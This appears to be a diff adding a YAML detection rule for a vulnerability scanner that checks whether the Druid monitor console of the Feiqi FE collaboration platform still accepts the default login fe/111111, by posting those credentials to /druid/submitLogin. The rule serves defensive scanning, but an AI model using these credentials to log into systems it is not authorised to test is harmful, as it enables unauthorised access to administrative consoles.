@@ -1,0 +1,15 @@
+name: 飞企互联-FE业务协作平台-druid-默认口令
+description: >-
+  fe/111111
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /druid/submitLogin
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      loginUsername=fe&loginPassword=111111
+    expression:
+      status: 200
+      body_all: ["success"]
